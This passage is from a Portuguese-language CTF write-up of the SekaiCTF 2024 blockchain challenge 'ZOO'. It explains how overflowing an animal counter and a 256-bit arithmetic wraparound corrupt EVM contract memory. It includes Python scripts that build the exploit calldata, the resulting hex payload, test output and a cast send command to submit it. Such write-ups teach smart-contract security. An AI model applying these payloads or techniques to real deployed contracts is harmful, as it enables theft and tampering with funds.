O primeiro argumento é um pouco (muito) mais enrolado,
mas a gente chega lá.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sstore(
</span></span><span class=line><span class=cl>    add(add(slot_hash, mul(2, idx)), 1),
</span></span><span class=line><span class=cl>    add(animal_counter, 1)
</span></span><span class=line><span class=cl>)
</span></span></code></pre></td></tr></table></div></div><p>Primeiro de tudo,
a gente realmente controla <code>idx</code>?
Esse número é aquele primeiro campo que cada animal tem,
e se você lembrar bem ele é armazenado em 32 bytes,
mas a função <code>fallback</code> na verdade só aceita números de 2 bytes pra esse valor.
Isso quer dizer que normalmente <code>0 &lt;= idx &lt; 2^16</code>,
o que simplesmente não vai funcionar.
Pra gente transformar aquele primeiro argumento em <code>1</code>,
com certeza precisamos controlar os 32 bytes do <code>idx</code>.</p><h1 id=em-busca-dos-outros-30-bytes-de-idx>Em busca dos outros 30 bytes de idx<a hidden class=anchor aria-hidden=true href=#em-busca-dos-outros-30-bytes-de-idx>#</a></h1><p>Precisamos de uma forma de
escrever um número qualquer de 32 bytes
no <code>idx</code> de um animal.
Tendo como base o caminho tomado até agora,
a primeira maneira de fazer isso
que veio à minha cabeça seria
usar o overflow na operação de edição do nome do animal.</p><p>Por exemplo,
uma forma seria criar dois animais
e depois editar o nome do primeiro
com um nome mais longo que o original,
sobrescrevendo o que vem logo depois,
que seria o <code>idx</code> do segundo animal.
Não tem nada de errado com essa lógica,
mas essa ideia não funciona.
Não funciona porque a parte do código
que edita o animal tem um bug
que não permite que você chame a operação de edição
mais de uma vez.
Se você reparar,
depois do <code>mcopy</code>,
o valor de <code>i</code> não é incrementado,
então as próximas instruções acabam sendo lidas
do novo nome do animal.
Não sei se o autor do chall esqueceu de incrementar o <code>i</code>
ou se isso foi de propósito,
mas isso meio que quebra a ideia de
usar a edição pra corromper
o <code>idx</code> do animal seguinte.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=k>case</span> <span class=mh>0x21</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>let</span> <span class=n>name_length</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>arr</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>),</span> <span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>name_length</span> <span class=p>:</span><span class=o>=</span> <span class=n>shr</span><span class=p>(</span><span class=mh>0xf0</span><span class=p>,</span> <span class=n>name_length</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=p>:</span><span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>mcopy</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=n>temp</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>arr</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>),</span> <span class=n>i</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=n>name_length</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=o>//</span> <span class=n>aqui</span> <span class=n>deveria</span> <span class=n>ter</span> <span class=n>um</span> <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>name_length</span><span class=p>),</span> <span class=n>mas</span> <span class=n>não</span> <span class=n>tem</span> <span class=p>:(</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Outra ideia seria simplesmente aproveitar
o overflow que a gente usou pra sobrescrever <code>functions</code>.
A gente seguiria corrompendo a memória,
até chegar no <code>idx</code> do primeiro animal.
Isso também não funciona.
Se você revisar o layout da memória que vimos antes,
vai reparar que a calldata fica armazenada
entre o início de onde conseguimos corromper (<code>0x40</code>)
e onde ficaria o <code>idx</code> do primeiro animal (<code>0x220</code>).
Isso significa que se o payload aumentar,
a distância até onde queremos corromper também aumenta,
porque a calldata <em>é</em> o nosso payload.
Por conta disso é impossível corromper
qualquer coisa que vier depois da calldata usando esse método.</p><p>A solução foi usar um outro overflow que não vimos ainda.
No final da operação que adiciona um animal,
a variável <code>animals_count</code> é incrementada.
Acaba que na verdade não tem nada que
verifica se o index onde você está adicionando um animal já está ocupado
ou se mais de 8 animais foram criados,
então é possível fazer <code>animals_count</code> ter um número
bem maior que o tamanho do array.
É só sair criando animais
que essa variável vai sendo incrementada.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>let</span> <span class=n>animals_count</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>local_animals</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mstore</span><span class=p>(</span><span class=n>local_animals</span><span class=p>,</span> <span class=n>add</span><span class=p>(</span><span class=n>animals_count</span><span class=p>,</span> <span class=mi>1</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>Por que isso é útil?
Porque o loop na função <code>commit</code>
itera <code>animal_count</code> vezes.
A intenção desse loop é
iterar cada elemento do array,
com cada iteração lendo o endereço de um animal.
Se <code>animal_count</code> for maior que o array,
o loop vai começar a ler o conteúdo dos animais em si,
que a gente controla.</p><p>A ideia então seria criar um animal
cujo <code>idx</code> é o endereço do seu próprio nome.
Assim, quando o loop vazar do array e chegar no primeiro animal,
ele seguiria o ponteiro e acharia que o <code>idx</code>
desse animal é o nome que a gente escolheu.
Como o nome não tem limite de tamanho,
a gente consegue setar ele pra um número de 32 bytes sem problema.
A gente só consegue controlar os 4 bytes menos significativos do <code>idx</code>,
mas isso não é um problema,
porque o endereço que a gente precisa escrever não é um número grande.</p><p>Abaixo é mostrado como a memória fica fazendo isso.
Em vermelho temos o array,
mas note que <code>animal_count</code> tem o valor 9,
que é maior que o tamanho do array.
Logo depois do array,
temos o primeiro animal,
cujo <code>idx</code> é igual ao endereço do seu nome (<code>0x320</code>).
No nome,
armazenamos o número que queremos que a função <code>commit</code>
interprete como o <code>idx</code> de um animal.</p><p>Quando a função <code>commit</code> recebe esse array,
ela vai iterando começando com o endereço do animal 0.
Como <code>animal_count</code> é 9,
ela então passa do array até chegar em <code>0x2e0</code>.
A função interpreta esse número como se fosse
o endereço do animal 8,
que na verdade nem existe.
Seguindo o ponteiro,
ela chega em <code>0x2e0</code>,
cujo valor controlamos.
Como os primeiros 32 bytes de um animal são seu <code>idx</code>,
a função vai achar que <code>0x320</code> na verdade
é o <code>idx</code> do animal 8.</p><p><img alt="Memória do contrato" loading=lazy src=/images/ottoboni-sekai-zoo/count.png></p><p>Montar esse esquema não é tão complicado quanto parece.
Abaixo temos uma função em Python que gera o hexa do primeiro animal.
Aqui não tem nada de muito misterioso,
simplesmente criamos um animal normalmente
com os valores corretos.
<code>idx</code> precisa ser o endereço onde o nome vai ficar
e o nome vai ser o valor que queremos
que o animal 8 tenha como <code>idx</code>.
Vamos ver como chegar nesse número em breve.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>def create_evil_animal():
</span></span><span class=line><span class=cl>    op = &#34;10&#34;
</span></span><span class=line><span class=cl>    idx = &#34;00&#34;
</span></span><span class=line><span class=cl>    index = &#34;0320&#34;
</span></span><span class=line><span class=cl>    name = &#34;&lt;valor que queremos para idx&gt;&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    animal = op + idx + f&#34;{len(name) // 2:04x}&#34; + index + name
</span></span><span class=line><span class=cl>    return animal
</span></span></code></pre></td></tr></table></div></div><p>Depois disso precisamos criar animais vazios
pra incrementar <code>animal_count</code>.
A seguinte função faz exatamente isso.
Aqui criamos vários animais iguais no mesmo índice
e com um nome vazio.
O objetivo aqui é realmente
só incrementar <code>animal_count</code>,
os valores em si não importam muito.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>def create_empty_animals(n):
</span></span><span class=line><span class=cl>    op = &#34;10&#34;
</span></span><span class=line><span class=cl>    idx = &#34;01&#34;
</span></span><span class=line><span class=cl>    index = &#34;eeee&#34;
</span></span><span class=line><span class=cl>    name = &#34;&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    animal = op + idx + f&#34;{len(name) // 2:04x}&#34; + index + name
</span></span><span class=line><span class=cl>    return n * animal
</span></span></code></pre></td></tr></table></div></div><h1 id=o-número-mágico>O número mágico<a hidden class=anchor aria-hidden=true href=#o-número-mágico>#</a></h1><p>Agora sim,
controlamos todos os 32 bytes de <code>idx</code>.
Pra que que servia isso mesmo?
Ah sim,
temos que setar o primeiro argumento do <code>sstore</code> pra 1.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sstore(
</span></span><span class=line><span class=cl>    add(add(slot_hash, mul(2, idx)), 1),
</span></span><span class=line><span class=cl>    add(animal_counter, 1)
</span></span><span class=line><span class=cl>)
</span></span></code></pre></td></tr></table></div></div><p>Temos que achar um número <code>idx</code> tal que
<code>slot_hash + (2 * idx) + 1</code>
seja <code>1</code>.
Isso a princípio parece impossível porque
a única solução seria <code>idx = 0</code>
com <code>slot_hash = 0</code>,
e a gente não controla <code>slot_hash</code>,
ele é um número gigante full aleatório.
Parece impossível,
mas só até você lembrar
que estamos no mundo dos computadores,
especificamente na EVM,
onde <code>2^256 = 0</code>.
Sim, eu estou falando de overflows.
Nós vamos transbordar <code>(2^256)-1</code>
e fazer o número dar a volta e cair exatamente em <code>1</code>.</p><p>A conta é bem tranquila de fazer com a shell do Python.
<code>m</code> é o maior número possível na EVM (256 bits) e
<code>h</code> é o <code>slot_hash</code> (peguei usando o debugger).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt;&gt;&gt; m = (2**256)-1
</span></span><span class=line><span class=cl>&gt;&gt;&gt; h = int(&#34;405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace&#34;,16)
</span></span><span class=line><span class=cl>&gt;&gt;&gt; (m-h)//2 + 1
</span></span><span class=line><span class=cl>43344706377821576760468996987613231211325356002982170351334206299952371618457
</span></span><span class=line><span class=cl>&gt;&gt;&gt; hex(_)
</span></span><span class=line><span class=cl>&#39;0x5fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae225299&#39;
</span></span></code></pre></td></tr></table></div></div><p>E assim,
<code>43344706377821576760468996987613231211325356002982170351334206299952371618457</code>
é o nosso número mágico
que vai colocar <code>1</code> no primeiro argumento do <code>sstore</code>.</p><h1 id=finalizando>Finalizando<a hidden class=anchor aria-hidden=true href=#finalizando>#</a></h1><p>Nosso payload final vai ser o seguinte então:</p><ol><li><code>create_evil_animal</code> - Criamos um animal cujo <code>idx</code> é o endereço do seu nome. No nome, colocamos o número mágico.</li><li><code>create_empty_animals</code> - Criamos vários animais vazios pra incrementar <code>animal_count</code>.</li><li><code>overwrite_ret</code> - Usamos a edição de nome pra sobrescrever o array <code>functions</code>, bypassando o <code>whenNotPaused</code>.</li></ol><p>O payload é longuinho e fazer tudo na mão seria tedioso,
então eu fiz um script pra montar ele bonitinho:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>overwrite_ret</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>op</span> <span class=o>=</span> <span class=s2>&#34;20&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=s2>&#34;07&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>edit</span> <span class=o>=</span> <span class=s2>&#34;21&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span> <span class=o>=</span> <span class=p>(</span><span class=mi>30</span> <span class=o>*</span> <span class=s2>&#34;00&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;ffff&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>ret</span> <span class=o>=</span> <span class=p>(</span><span class=mi>30</span> <span class=o>*</span> <span class=s2>&#34;00&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;0323&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>write</span> <span class=o>=</span> <span class=n>free</span> <span class=o>+</span> <span class=p>(</span><span class=mi>32</span> <span class=o>*</span> <span class=s2>&#34;00&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=mi>31</span> <span class=o>*</span> <span class=s2>&#34;00&#34;</span> <span class=o>+</span> <span class=s2>&#34;01&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>    <span class=n>write_len</span> <span class=o>=</span> <span class=n>f</span><span class=s2>&#34;{len(write) // 2:04x}&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>op</span> <span class=o>+</span> <span class=n>idx</span> <span class=o>+</span> <span class=n>edit</span> <span class=o>+</span> <span class=n>write_len</span> <span class=o>+</span> <span class=n>write</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_evil_animal</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>op</span> <span class=o>=</span> <span class=s2>&#34;10&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=s2>&#34;00&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>=</span> <span class=s2>&#34;0320&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># número mágico</span>
</span></span><span class=line><span class=cl>    <span class=n>name</span> <span class=o>=</span> <span class=s2>&#34;5fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae225299&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>animal</span> <span class=o>=</span> <span class=n>op</span> <span class=o>+</span> <span class=n>idx</span> <span class=o>+</span> <span class=n>f</span><span class=s2>&#34;{len(name) // 2:04x}&#34;</span> <span class=o>+</span> <span class=n>index</span> <span class=o>+</span> <span class=n>name</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>animal</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_empty_animals</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op</span> <span class=o>=</span> <span class=s2>&#34;10&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=s2>&#34;01&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>=</span> <span class=s2>&#34;eeee&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>name</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>animal</span> <span class=o>=</span> <span class=n>op</span> <span class=o>+</span> <span class=n>idx</span> <span class=o>+</span> <span class=n>f</span><span class=s2>&#34;{len(name) // 2:04x}&#34;</span> <span class=o>+</span> <span class=n>index</span> <span class=o>+</span> <span class=n>name</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>n</span> <span class=o>*</span> <span class=n>animal</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>final</span> <span class=o>=</span> <span class=n>create_evil_animal</span><span class=p>()</span> <span class=o>+</span> <span class=n>create_empty_animals</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>overwrite_ret</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>final</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Rodando esse script obtemos:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1000002003205fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae22529910010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee2007210080000000000000000000000000000000000000000000000000000000000000ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000323
</span></span></code></pre></td></tr></table></div></div><p>Colocando esse valor no nosso contrato de testes,
vemos que deu tudo certo e <code>isSolved</code> foi setado pra 1 como queríamos.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ forge test -vv
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[⠊] Compiling...
</span></span><span class=line><span class=cl>No files changed, compilation skipped
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ran 1 test for test/ZOO.t.sol:ZOOTest
</span></span><span class=line><span class=cl>[PASS] test_bypass_pause() (gas: 458630)
</span></span><span class=line><span class=cl>Logs:
</span></span><span class=line><span class=cl>  Success
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.03ms (297.42µs CPU time)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ran 1 test suite in 5.17ms (1.03ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
</span></span></code></pre></td></tr></table></div></div><p>Na hora de resolver o chall no CTF de verdade,
podemos usar o <code>cast send</code> pra mandar nosso payload como calldata.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cast send --rpc-url $rpc --private-key $private $zoo 0x1000002003205fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae22529910010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee2007210080000000000000000000000000000000000000000000000000000000000000ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000323
</span></span></code></pre></td></tr></table></div></div><p>Flag: <code>SEKAI{super-duper-memory-master-:3}</code></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=http://localhost:1313/blog/2024-08-11-tutorial-game-hacking-cheat-engine/><span class=title>Next »</span><br><span>Tutorial de Game Hacking utilizando Cheat Engine</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share SekaiCTF 2024 writeup: Blockchain/ZOO on x" href="https://x.com/intent/tweet/?text=SekaiCTF%202024%20writeup%3a%20Blockchain%2fZOO&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-25-sekaictf-zoo%2f&amp;hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share SekaiCTF 2024 writeup: Blockchain/ZOO on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-25-sekaictf-zoo%2f&amp;title=SekaiCTF%202024%20writeup%3a%20Blockchain%2fZOO&amp;summary=SekaiCTF%202024%20writeup%3a%20Blockchain%2fZOO&amp;source=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-25-sekaictf-zoo%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share SekaiCTF 2024 writeup: Blockchain/ZOO on reddit" href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-25-sekaictf-zoo%2f&title=SekaiCTF%202024%20writeup%3a%20Blockchain%2fZOO"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share SekaiCTF 2024 writeup: Blockchain/ZOO on facebook" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-25-sekaictf-zoo%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share SekaiCTF 2024 writeup: Blockchain/ZOO on whatsapp" href="https://api.whatsapp.com/send?text=SekaiCTF%202024%20writeup%3a%20Blockchain%2fZOO%20-%20http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-25-sekaictf-zoo%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 